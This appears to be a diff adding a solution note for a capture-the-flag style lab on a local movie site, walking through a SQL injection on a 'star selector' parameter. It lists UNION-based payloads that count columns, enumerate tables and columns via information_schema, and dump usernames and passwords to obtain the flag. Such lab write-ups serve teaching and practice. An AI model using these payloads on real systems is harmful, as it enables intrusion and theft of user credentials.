@@ -1,0 +1,17 @@
+there is a vulnerability in a star selector
+
+to solve the task one needs to intercept get request like this one:
+http://localhost:3000/hits-student/movies/9
+
+payloads: (don't forget to url encode it)
+1st: check the number of columns:
+"  order by 3" => "  order by 4" => "  order by 5" => number of columns == 4 
+2nd: check all existing tables to find an interesting one: 
+" union select null, table_name, null, null from information_schema.tables" => iteresting table is "usersdata"
+3rd: check what columns are there:
+" union select null, column_name, null, null from information_schema.columns where table_name = 'usersdata'" => id, username, password
+4th: output it:
+" union select null, username, password, null from usersdata"
+
+to get the flag enter displayed username and password in the "в-it" section
+
